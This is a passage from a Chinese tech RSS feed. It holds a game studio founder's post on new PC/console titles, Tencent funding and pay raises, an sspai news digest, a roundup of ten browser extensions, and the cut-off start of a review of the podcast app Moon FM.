Blade：Executioners（影之刃：断罪者）》将在海外地区曝光，除了手游版本外，未来还将推出互通的PC和Switch版本。这是我们首次自行尝试海外发行，相关部门同学最近非常辛苦，大家多给他们掌声。</p>\n<p><b><i>我们在未来的五年内，将研发两款以PC/主机为主，可能会使用云游戏等技术进行跨平台发布的大型动作/ARPG游戏。</i></b></p>\n<p>《影之刃零》是一款延续了《影之刃》系列的正统续作，但回到了原点，即独立游戏《雨血》及《雨血2》的故事基础，加入大量全新内容而成。战斗将在3D空间内延续系列的技能链等设计，以武侠电影般的超高速战斗和氛围塑造为特色（以下为实机截图）。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-414c08f8ad052dd80258a165fcdf45c3_720w.jpeg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"3840\" data-rawheight=\"1830\" data-watermark=\"watermark\" data-original-src=\"v2-414c08f8ad052dd80258a165fcdf45c3\" data-watermark-src=\"v2-2db07915aae418ecdb804604d6aa4cbe\" data-private-watermark-src=\"v2-8b114a3f041b184e6588dd6cdf85f9e1\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-4b7b8453f105031bcca93cbc057a84c2_720w.jpeg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"3840\" data-rawheight=\"1836\" data-watermark=\"watermark\" data-original-src=\"v2-4b7b8453f105031bcca93cbc057a84c2\" data-watermark-src=\"v2-7afb9e3e4f34fe2b5154cb519da87111\" data-private-watermark-src=\"v2-6d0925bea8126adedc90412c28e82423\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-7819d32854b3ad9f89ff768b74c32349_720w.jpeg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"3942\" data-rawheight=\"2184\" data-watermark=\"watermark\" data-original-src=\"v2-7819d32854b3ad9f89ff768b74c32349\" data-watermark-src=\"v2-2234a80b5862d771270127101c72238d\" data-private-watermark-src=\"v2-ca871293e1ae705bbfa9d3d7e4062a3e\"></p>\n<p>《群星守卫》是一款描写在广阔黑暗的太空中，人类为了在高等文明的高维战争中追求一线生机，而展开永无归途的悲壮冒险故事。这是一款具备一定自由度的太空开放世界的产品。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-6e0eb9259514ab6650266bd3d38f57be_720w.jpeg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"3840\" data-rawheight=\"1836\" data-watermark=\"watermark\" data-original-src=\"v2-6e0eb9259514ab6650266bd3d38f57be\" data-watermark-src=\"v2-14f52cfd0e23559b583292c460b11576\" data-private-watermark-src=\"v2-c6a6274376eecddc9e5ca2188c151691\"></p>\n<p>两款产品均使用虚幻5引擎进行开发，目前仍未有足够完整的成果供进一步展示，希望这一天能尽早到来，项目组的大家加油！</p>\n<p><b><i>可能有的同事们已经注意到，我们于近日完成了一轮数亿规模的融资，投资方为腾讯。</i></b></p>\n<p>从大概2018年起，我，麻辣丝和Michael带领的一个小团队，一直在没有对外透露任何信息的情况下，持续进行着PC/主机游戏的开发——那是火种，幼苗，或是我们在研发手游之余用于调剂和放松的“秘密花园”，一个在留存/付费率/ARPU的世界中可供暂时喘息的庇护所。当然，这种近乎任性的持续投入在财务层面是颇具风险的，我们也应当独自承担这种风险，今年春节前后，恰逢来自网易和真格基金的两轮早期投资陆续期满，我们创始团队回购了这部分股份，两个早期投资人陪伴我们多年，我们受益良多，在此表达诚挚的感谢！</p>\n<p>不久之前，在非常偶然的情况下，腾讯得知了我们制作大型PC/主机游戏的想法，随即前来了解情况。在深入探讨后，腾讯提出在不干涉公司经营，不绑定产品合作，不影响作品创作的前提下，对我们进行资金支持和其它必要的帮助。我们很快达成了合作，在这段期间的交流中，腾讯对游戏理念，文化和产业的理解，使得我们得以从更广阔的角度去思考自身与全球游戏产业发展脉络之间的关系。</p>\n<p><b><i>这轮融资不会将我们由玩家口中的“小作坊”转变成“大工厂”</i></b>，但希望我们可以变成更高效，强大的“精品作坊”。当年成立之初立下的“小团队，大作品”Flag，我们做到了——这些年来，我们用10个人做出了销量超30万套的PC单机《雨血前传：蜃楼》，17个人做出了月流水超4000万的《影之刃》，以及研发+运营总共不到30个人做出了月流水过亿的《影之刃3》。目前，公司总人数为70余人，但即使在拥有充沛的现金流情况下，我们的规模也将长期保持在150人以内，相应地，志同道合的优秀人才的需求变得更加强烈了。</p>\n<p>在早期，规模也许是一种限制，但在资源充足的情况下，经过自我剖析和内心追问后，这变成了一种选择——一种在管理大公司的“企业家”和开发者身份之间，投向后者的选择。</p>\n<p>若干年前，公司内部曾出现一种情绪，认为人生巅峰就看眼前这一票，一定要把握“时间窗口”，顺着“风口”干票大的，否则，“我马上就30了”。结果是这么多年过去了，我们都毫无悬念地过了30，虽然小成就有一些，但也没有干成什么足够“大”的。</p>\n<p>后来，我们终于发现，拥有一件热爱的事情，并且还能够有条件不断地去做，越做越有乐趣，越做越有滋味，本身就已经够奢侈了。在困境中时，我往往看向许多年前的我自己——在学校制作《雨血》的时候，当年的一张A4纸上同时夹杂绘制着剧情大纲，地图衔接示意和人设草图，那是一个开发者的理想时刻，相信每个人都有着类似的一个时刻，希望大家不要忘了那一刻的自己。 </p>\n<p><img src=\"https://pic1.zhimg.com/v2-882926fa8efa931e88b606b28f235d41_720w.jpeg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"4804\" data-rawheight=\"3509\" data-watermark=\"watermark\" data-original-src=\"v2-882926fa8efa931e88b606b28f235d41\" data-watermark-src=\"v2-ae52fea282f97d46a0c23053c1d9fd05\" data-private-watermark-src=\"v2-7200a939cbccdd2318100ff0065b53ad\"></p>\n<p>风口来去，猪飞猪落，让我们不妨把3，5年的时间窗口淡忘，而把目光投放在数十年的时间尺度上，人类一直需要更加有趣，更加新颖的娱乐体验，中国也一直需要讲出真正属于我们自己的，引人入胜的故事——无论是武侠的故事，还是太空的故事。如果这些长期事实确认无误，我们便可更加从容地面对眼前的风云变幻。</p>\n<p>祝大家能够一如既往地享受游戏，享受生活！<b><i>自十月起，我们全员薪资上调20%，这与年初时已经进行过的15%普调不冲突，也与其它十月份之前的单独调薪不冲突</i></b>。</p>\n<p><br></p>\n<p>祝大家国庆节快乐！谢谢大家！</p>\n<p>Soulframe</p>\n<p>2021年9月30日</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/soulframe1985?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">SoulframEE</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/489859299/answer/2147658980?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">34 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/269308283?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何评价「腾讯28亿元投资育碧」?</a><br><a href=\"http://www.zhihu.com/question/295865544?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">为什么腾讯的游戏不比别的公司的游戏好，还有那么多人玩？</a><br>\n","link":"http://www.zhihu.com/question/489859299/answer/2147658980?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"派早报：USB Type-C 2.1 标准公布、Xbox Series X|S 支持杜比视界等","date":"2021-09-30 00:59:02","description":"\n<h2>你可能错过的新鲜事</h2>\n<h3>USB Type-C 2.1 标准正式推出</h3>\n<p>9 月 29 日，USB-IF 协会在其网站公布了最新的 USB Type-C 2.1 标准。其中，USB PD 协议里的 20V / 5A 的供电提升至 48V / 5A，相当于供电功率从 100W 提升到 240W。<a href=\"https://www.pcgamer.com/usb-type-c-2-1-240w-gaming-laptop-power/\" target=\"_blank\">来源</a></p>\n<h3>任天堂否认推出 4K 版游戏主机</h3>\n<p>据知名新闻媒体 Bloomberg 报道，至少 11 家游戏公司目前已经收到了 Switch 游戏机的 4K 开发套件。报道还表示，由于受到了疫情影响，任天堂未能按照原计划推出 4K 版游戏主机，仅推出了 Switch 的 OLED 版本。任天堂方面回应了该报道，表示目前没有新主机计划。<a href=\"https://www.polygon.com/22701181/nintendo-switch-4k-model-release-date-report\" target=\"_blank\">来源 1</a>，<a href=\"https://twitter.com/NintendoCoLtd/status/1443366440183074819\" target=\"_blank\">来源 2</a></p>\n<h3>Chrome 浏览器将支持 Windows 11 风格</h3>\n<p>在 Windows 11 系统即将到来之际，Google 方面希望 Chrome 浏览器可以在视觉上与新系统更为贴近。据 Chromium Gerrit 上的一个新补丁显示，Google 正在努力使 Chrome 运行时具有 Windows 11 的风格。Google 并未在产品中展示新的 Chrome 会在哪些方面做出改变，可能会包含透明效果及程序图标等。<a href=\"https://www.ithome.com/0/578/385.htm\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/30/article/2becbd3c7f92660935dd4d72562613b2\"><figcaption>图片来自新闻源</figcaption></figure><h3>劳斯莱斯推出旗下首款量产版电动车</h3>\n<p>9 月 29 日，高端汽车品牌劳斯莱斯发布了旗下首款量产版电动车闪灵（Spectre)。闪灵整体为一辆双门轿跑，基于幻影平台打造。劳斯莱斯方面表示，该车型将于 2023 年第三季度上市。同时，劳斯莱斯还宣布将于 2030 年完成电动化。<a href=\"https://www.cnbeta.com/articles/tech/1185041.htm\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/30/article/e3124bb5dd1e317fb1239234293cfc53\"><figcaption>图片来自新闻源</figcaption></figure><h3>微软 Xbox Series X|S 正式支持杜比视界游戏</h3>\n<p>9 月 29 日，微软更新官网新闻公告，正式宣布 Xbox Series X|S 系列主机开始支持杜比视界游戏，受支持的游戏已超过 100 款，用户可以通过「设置——常规——电视和显示选项——视频模式——杜比视界游戏」开启杜比视界的功能。<a href=\"https://news.xbox.com/en-us/2021/09/28/dolby-vision-gaming-now-available-on-xbox-series-x-s/\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/30/article/0ce4a074e2505af31d161ed2a3b0c545\"></figure><h3>HBO 公布真人剧集版《最后生还者》首张剧照</h3>\n<p>近日，视频流媒体平台 HBO 公布了真人版《最后生还者》（The last of us）的首张剧照。《最后生还者》改编自同名游戏作品，讲述了二十年后的近未来发生在地球上的疫病感染灾难。<a href=\"http://content.mtime.com/article/228743665\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/30/3ad047327693ba90c033f6f472c855e1.jpeg\"><figcaption>图片来自新闻源</figcaption></figure><h2>看看就行的小道消息</h2>\n<ul>\n<li>在 macOS Monterey 的第八个 beta 版出现了「High Power Mode」的线索，Apple 或许将为 MacBook Pro 带来可调节的性能模式。<a href=\"https://9to5mac.com/2021/09/28/macos-monterey-high-power-mode/\" target=\"_blank\">来源</a>\n</li>\n<li>知名爆料博主 OnLeaks 放出了一加新款主动降噪耳机一加 Buds Z2 的渲染图，该耳机或许将与一加 9RT 同步推出。<a href=\"https://news.mydrivers.com/1/786/786565.htm\" target=\"_blank\">来源</a>\n</li>\n</ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/30/article/d503b716d7948f653988c48e7691ce2a\"><figcaption>图片来自新闻源</figcaption></figure><h2><strong>少数派的近期动态</strong></h2>\n<ul>\n<li>🚗 国庆不想出远门？一起在 <a href=\"https://sspai.com/bullet/1632815670\" target=\"_blank\">一派</a> 聊聊你所在的城市附近都有哪些值得一去的地方吧！</li>\n<li>📖 Apple 发布会上没有「One More Thing」？我们给你备上了：《少数派系统指南 · iOS 15》上架预购八折优惠中，更多介绍请前往 <a href=\"https://sspai.com/series/228\" target=\"_blank\">栏目页面</a> 查看。</li>\n<li>🦦 十一将至，贴心水獭为即将出门远行的你带来了些 <a href=\"https://sspai.com/post/68979\" target=\"_blank\">好东西</a>。</li>\n<li>🎁 少数派会员增刊<a href=\"https://sspai.com/prime/precog/sp-0x00\" target=\"_blank\">《科技漫游》第〇期已经发布</a>，会员群、知识库同期上线，<a href=\"https://item.taobao.com/item.htm?ft=t&amp;id=655886576972\" target=\"_blank\">现在购买</a> 可获赠价值 40 元的白描黄金版。</li>\n<li>🎉 少数派正版软件商城 <a href=\"https://sspai.com/mall/discount/%E5%BC%80%E5%AD%A6%E5%AD%A3%E4%BF%83%E9%94%80\" target=\"_blank\">开学季促销</a> 继续进行中，数十款优质软件低至 5 折起。</li>\n<li>📕 由少数派编辑部联合优秀作者出版实体书《数字时代的效率手册》上线电商平台，立即前往 <a href=\"https://item.jd.com/12914331.html\" target=\"_blank\">5 折下单</a>，Kindle 商店电子书版也已上架。</li>\n</ul>\n<h2>你可能错过的好文章</h2>\n<ul>\n<li><a href=\"https://sspai.com/post/69025\" target=\"_blank\">📒 玩转 Obsidian 06：如何用渐进式总结笔记，把知识交给未来的自己</a></li>\n<li>🎧 <a href=\"https://sspai.com/post/68895\" target=\"_blank\">设计精美功能全，好用的全平台播客 App：Moon FM</a>\n</li>\n<li>🔌 <a href=\"https://sspai.com/post/69035\" target=\"_blank\">实用而有趣的浏览器扩展，我们又为你找到了这 10 款</a>\n</li>\n</ul>\n<p>&gt; 今天是国庆长假前的最后一期派早报啦，祝祖国生日快乐，祝你节日开心🎈</p>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号</a>，解锁全新阅读体验 📰</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\">正版软件</a>，少数派为你呈现 🚀</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/69055"},{"title":"实用而有趣的浏览器扩展，我们又为你找到了这 10 款","date":"2021-09-29 08:00:00","description":"\n<p>距离少数派上次推荐浏览器扩展已两月有余，Chrome 的版本号已经来到了 94，而 Firefox 也做出了将默认搜索引擎替换为 Bing 的尝试（仅在参与研究的用户中静默替换 10%），对更好的网页浏览体验的追求总是无止境的，那么浏览器扩展这边又哪些好用、有趣的「新玩意」和值得关注的更新呢？</p>\n<p>本文就为你搜集了 10 款值得一试的浏览器扩展。</p>\n<p><strong>关联阅读：</strong><a href=\"https://sspai.com/post/69008\">更快的稳定版更新节奏开始了：Chrome/Edge 94 新功能盘点</a></p>\n<h2>Jumpskip：跳过 Jump scare</h2>\n<p>你是否和很多人一样喜欢观看惊悚悬疑剧集却常常被其中的 Jump scare（突发惊吓）吓到？</p>\n<p>开发者 <a href=\"https://alyssax.com/\" target=\"_blank\">Alyssa X</a> 开发了一款 Netflix 的 Chrome 扩展解决这个问题。<a href=\"https://github.com/alyssaxuu/jumpskip\" target=\"_blank\">Jumpskip</a> 能帮助你在观看剧集时跳过、静音和提前发出警告，同时还可以查看所有 Jump scare 的时间戳，让你有所准备、免受惊扰。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5a0vgdb34teh3cl8ie0.png\"></figure><p>你可以在 <a href=\"https://github.com/alyssaxuu/jumpskip\" target=\"_blank\">GitHub</a> 或 <a href=\"https://chrome.google.com/webstore/detail/jumpskip-skip-jumpscares/fbemiaecodgpghdfegmdcikjkobdghab\" target=\"_blank\">Chrome 网上应用商店</a> 免费获取 Jumpskip。</p>\n<h2>Tango：快速制作带截图的流程指南</h2>\n<p>Tango 是一个有创意且实用的快速制作流程指南的工具。</p>\n<p>其便捷之处在于你只需要在浏览器中完成整个流程动作而不需要考虑其他问题，Tango 会自动按步骤生成流程文档，并配上带有高亮的截图和明确的操作文本。文档生成之后，你可以自由地进行编辑、评论等操作，并分享链接给任何人，甚至下载一份简洁的 PDF 文档。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5a0vgdb34teh3cl8ieg.png\"></figure><p>我使用 Tango 制作了一个<a href=\"https://app.tango.us/app/workflow/07576640-5ffa-470b-8ec3-a2c8db4764bd\" target=\"_blank\">实例</a>，以供大家参考。</p>\n<p>你可以在 <a href=\"https://www.tango.us/\" target=\"_blank\">官网</a> 或 <a href=\"https://chrome.google.com/webstore/detail/tango/lggdbpblkekjjbobadliahffoaobaknh\" target=\"_blank\">Chrome 网上应用商店</a> 免费获取 Tango。</p>\n<h2>Bubbles：网页截图分享协作</h2>\n<p>Bubbles 是一款网页截图分享协作扩展。你可以在网页中生成长截图或录制视频，并分享给任何人。而打开链接的任何用户均有权限对分享的截图或视频进行标注评论。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5a0vglb34teh5fkvac0.png\"></figure><p>我使用 Bubbles 制作了一个<a href=\"https://app.usebubbles.com/qNvJPsoHH2ehwvhSjRmfYi/comments-on-shyrz-me/\" target=\"_blank\">实例</a>，以供大家参考。</p>\n<p>你可以在 <a href=\"https://www.usebubbles.com/\" target=\"_blank\">官网</a> 或 <a href=\"https://chrome.google.com/webstore/detail/bubbles-screenshot-and-sc/ppbfhhgcdehhbjigifndnfmcihegokbb\" target=\"_blank\">Chrome 网上应用商店</a> 免费获取 Bubbles。</p>\n<h2>SingleFile：更优雅的网页保存方式</h2>\n<p>相信很多用户常有保存网页的需求，但却因难以管理的网页内容文件而头痛。以维基百科为例，普通 <code>Ctrl + S</code> 保存方式将生成以下文件：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5a0vgtb34teh5fkvacg.png\"></figure><p>同时，在 <code>{sitename}_files</code> 文件夹下，会一股脑地塞进 <code>.html</code> 文件所引用的各种图片、脚本，</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5a0vh5b34teh3cl8if0.png\"></figure><p>而 SingleFile 可以帮助你将完整的网页保存到单个文件中，且占用空间更小。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5a0vhdb34teit0pmne0.png\"></figure><p>除此之外，SingleFile 还提供丰富的设置项，可以对文件名、HTML 内容、样式、图片、字体等进行调整。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5a0vhlb34teh3cl8ifg.png\"></figure><p>你可以在 <a href=\"https://github.com/gildas-lormeau/SingleFile\" target=\"_blank\">GitHub</a>、<a href=\"https://chrome.google.com/extensions/detail/mpiodijhokgodhhofbcjdecpffjipkle\" target=\"_blank\">Chrome 网上应用商店</a>、<a href=\"https://microsoftedge.microsoft.com/addons/detail/efnbkdcfmcmnhlkaijjjmhjjgladedno\" target=\"_blank\">Edge 网上应用商店</a> 或 <a href=\"https://addons.mozilla.org/firefox/addon/single-file\" target=\"_blank\">Firefox 附加组件商店</a> 免费获取 SingleFile。</p>\n<h2>划词翻译：支持 DeepL 的翻译扩展</h2>\n<p>浏览器网页翻译扩展不少，但像划词翻译这样颜值与功能兼备的并不多。</p>\n<p>划词翻译可以对网页、图片、PDF 文件、音频进行翻译，翻译接口包括 DeepL、谷歌、必应、百度、腾讯、彩云、阿里、搜狗、有道。需要注意的是，部分翻译接口需要用户前往对应平台<a href=\"https://hcfy.app/docs/services/intro/\" target=\"_blank\">申请 API 密钥</a>，好在过程并不复杂。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5a0vhtb34teh0gc1ang.png\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5a0vi5b34teh3cl8ig0.png\"></figure><p>你可以在 <a href=\"https://hcfy.app/\" target=\"_blank\">官网</a>、<a href=\"https://chrome.google.com/webstore/detail/ikhdkkncnoglghljlkmcimlnlhkeamad\" target=\"_blank\">Chrome 网上应用商店</a>、<a href=\"https://microsoftedge.microsoft.com/addons/detail/oikmahiipjniocckomdccmplodldodja\" target=\"_blank\">Edge 网上应用商店</a> 或 <a href=\"https://addons.mozilla.org/zh-CN/firefox/addon/hcfy/\" target=\"_blank\">Firefox 附加组件商店</a> 免费获取划词翻译。</p>\n<h2>New Tab Studio: 高度自定义的新标签页</h2>\n<p>如果你对 Momentum 等老牌 New Tab 浏览器扩展感到审美疲劳，不妨来尝试一下这款 New Tab Studio。</p>\n<p>这是一款可高度自定义的新标签页，所有界面元素均以插件形式挂载到扩展中，包括倒数日、时钟、名言、习惯、自定义文本等，甚至还允许内嵌网页作为 <code>iframe</code>。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5a0vidb34teit0pmneg.png\"></figure><p>同时，扩展还支持将你制作的主题上传到用户主题商店分享给其他用户，或者下载别人制作好的主题。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5a0vitb34teh0gc1ao0.png\"></figure><p>你可以在 <a href=\"https://new-tab.studio/\" target=\"_blank\">官网</a> 或者 <a href=\"https://chrome.google.com/webstore/detail/new-tab-studio-countdown/epngggilgnflanfabeldfpbgponcgpgl\" target=\"_blank\">Chrome 网上应用商店</a> 免费获取 New Tab Studio。另外，扩展还有付费的 Pro 版本可供选择。</p>\n<h2>Mue：简洁实用的开源新标签页</h2>\n<p>Mue 是一款开源的新标签页浏览器扩展，界面简洁大方，支持自定义背景、时间、名言、问候、搜索、快速链接、天气、备忘录等，是非常好的 Momentum 开源替代。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5a0vjlb34teh3cl8igg.png\"></figure><p>你可以在 <a href=\"https://github.com/mue/mue\" target=\"_blank\">GitHub</a>、<a href=\"https://chrome.google.com/webstore/detail/mue/bngmbednanpcfochchhgbkookpiaiaid\" target=\"_blank\">Chrome 网上应用商店</a>、<a href=\"https://microsoftedge.microsoft.com/addons/detail/aepnglgjfokepefimhbnibfjekidhmja\" target=\"_blank\">Edge 网上应用商店</a>、<a href=\"https://addons.mozilla.org/firefox/addon/mue\" target=\"_blank\">Firefox 附加组件商店</a>免费获取 Mue。</p>\n<h2>Microsoft Outlook：微软邮箱应用的浏览器扩展版本</h2>\n<p>没错，Microsoft Outlook 推出了一款浏览器插件。</p>\n<p>如果你是 Microsoft 全家桶用户想必会非常欣喜，因为它除了收发邮件外还将日历、联系人、甚至 Microsoft Todo 整合到了一起。虽然当前还处于预览版本，但已颇为可用，邮件内容也可以一并在扩展内查看而不是跳转网页。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5a0vjtb34teh0gc1aog.png\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5a0vk5b34teh0gc1ap0.png\"></figure><p>你可以在 <a href=\"https://microsoftedge.microsoft.com/addons/detail/microsoft-outlook/kkpalkknhlklpbflpcpkepmmbnmfailf\" target=\"_blank\">Edge 网上应用商店</a> 免费获取 Microsoft Outlook。</p>\n<h2>tabExtend：更实用的标签页管理方式</h2>\n<p>tabExtend 是一款标签页管理浏览器扩展，能够帮助你轻松处理标签页、笔记和待办事项，在浏览器中更便捷地组织所有内容。</p>\n<p>相较于浏览器传统的标签页管理方式，tabExtend 具有更直观的界面，同时将标签页与笔记、待办事项轻度结合使得这个扩展有更多可能性，也更符合用户的使用逻辑。界面美观，动效有趣，只需鼠标拖动即可将标签页进行分类和暂存。试用版本仅可使用 1 个工作区、存储 30 个标签页，付费版本则可使用多个工作区、无限存储标签页，每月 6 美元。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5a0vk5b34teh0gc1apg.png\"></figure><p>你可以在 <a href=\"https://www.tabextend.com/\" target=\"_blank\">官网</a>、<a href=\"https://chrome.google.com/webstore/detail/tabextend/ffikidnnejmibopbgbelephlpigeniph\" target=\"_blank\">Chrome 网上应用商店</a> 或 <a href=\"https://microsoftedge.microsoft.com/addons/detail/tabextend/afddlgcjhdhkgimldgmppegmnbmogolg\" target=\"_blank\">Edge 网上应用商店</a> 免费获取 tabExtend。</p>\n<h2>Workona：标签页管理一站式解决方案</h2>\n<p>Workona 其实之前在少数派 <a href=\"https://sspai.com/post/56888\" target=\"_blank\">2019 年的文章</a>中有所提及，经过两年发展尤其是近期 Workona 推出了付费计划之后，整个产品的方向从之前类似 Station 的形态发生了较大转变，如今的 Workona 更像是上文提及的 tabExtend 的高阶替代，主要面向团队用户（不过对个人用户也很好用），对标签页的组织方式更全面、也与多人协作结合更紧密。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5a0vkdb34teh3cl8ih0.png\"></figure><p>Workona 提供的扩展多达 4 种，用户可根据需要下载以启用对应功能。</p>\n<p>其中 Workona Tab Manager 是主扩展，类似上文提到的 tabExtend 的主要功能 —— 对标签页进行分工作区、分组的管理：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5a0vklb34teh0gc1aq0.png\"></figure><p>而笔记方面，Workona 内置了一个较为完善的文本编辑器，支持 Markdown 的同时还允许用户将笔记与保存的标签页进行绑定：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5a0vktb34teh5fkvad0.png\"></figure><p>如图所示，Workona Tab Manager 的主界面在开启 Task 后分为两栏显示，对标签页的操作在左侧 Tabs 栏内完成，只需将标签页拖动到你想要分类的区域（左栏）即可。而对工作区（Workspace）中常用的一些页面，则可以点击书签按钮将其标记为资源（Resource），该标签页将永久保存到当前工作区。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5a0vl5b34teh3cl8ii0.png\"></figure><p>Workona Tab Suspender 是标签页冻结扩展，启用后可以在闲置时（或其他设定条件）冻结标签页以降低浏览器内存占用。如果你曾经使用过 The Great Suspender，就知道这个扩展的价值所在。但由于其原作者将其出售，新作者在其中植入可疑代码的消息传出导致很多人弃用了这款扩展。不过好在有开发者将其原开源代码复刻后上传商店，涌现出 The Great Suspender Original、The Marvellous Suspender 等衍生作品。而 Workona Tab Suspender 也是一款优秀替代，其实早在 The Great Suspender 被收购之前，Workona 就内置了此功能，堪称神器。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5a0vl5b34teh3cl8iig.png\"></figure><p>Workona Task 是待办事项扩展，启用后用户可以进行简单的待办事项管理和协作：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5a0vldb34teh3cl8ij0.png\"></figure><p>最后，Workona New Tab 是新标签页扩展，启用后会将新标签页替换为 Workona 面板。</p>\n<p>前文提到 Workona 是一个面向团队的解决方案，因此如果你是团队用户的话，上述功能均可在团队空间中共享协作：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5a0vllb34teh0gc1aqg.png\"></figure><p>Workona 免费账户仅允许创建 5 个工作区，但与 tabExtend 不同的是对标签页、任务、笔记的数量没有限制；而 Pro 和 Business 账户则不限制工作区，并提供一系列增值功能，价格分别为每人每月 7 美元和 15 美元。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5a0vllb34teh3cl8ijg.png\"></figure><p>你可以在 <a href=\"https://workona.com/\" target=\"_blank\">官网</a> 免费获取 Workona 的四种不同扩展，此外还提供 <a href=\"https://apps.apple.com/us/app/workona-project-organizer/id1514249129\" target=\"_blank\">iPadOS 应用</a>。</p>\n<hr>\n<p>以上就是本期介绍的所有 10 款浏览器扩展插件，如果你也有好的扩展插件，欢迎在评论留言分享，我们下期再见~</p>\n<p>&gt; 还没看够？<a href=\"https://sspai.com/topic/102\" target=\"_blank\">浏览扩展百宝箱</a> 专题现已上线，总有一款适合你！</p>\n<p>&gt; 下载少数派 <a href=\"https://sspai.com/page/client\">客户端 </a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号 </a>，了解更妙的数字生活 🍃</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/69035"},{"title":"设计精美功能全，好用的全平台播客 App：Moon FM","date":"2021-09-29 06:35:50","description":"\n<p>现在听播客成为了相当受欢迎的获取新知识和内容的途径，而对于大部分的用户而言，收听播客往往通过网易云音乐、喜马拉雅这些专门提供音频内容的平台，至于专门收听播客的平台，小宇宙、Apple 的 Podcast 都是不错的渠道，你只需要在上面搜索或者通过推荐页找到自己喜欢的播客节目。选择关注或者订阅就可以收听</p>\n<p>但对于真正的播客爱好者而言，通过平台进行收听播客有着天然的局限性，并不是自己喜欢的节目都可以在某一个单一平台都能听到，所以更希望能够自由地选择播客节目并使用 RSS 源地址来进行播客节目的订阅，我们将这种播客客户端作为泛用型播客客户端，而这其中不乏有大家耳熟能详的 App：Pocket Casts、Overcast、Castro……</p>\n<p>但对比这些泛用型播客客户端之后其实不难发现，其部分功能并不适应国内的播客使用场景，尤其是在跨平台同步上都或多或少都存在一些不便之处，那么有没有适用于国内播客收听场景，同时支持跨平台同步的泛用型播客客户端呢？</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c541rgtb34te12vuo61g.png\"></figure><p>由国内应用开发者 DengMing Gao 开发的跨平台泛用型播客客户端 Moon FM 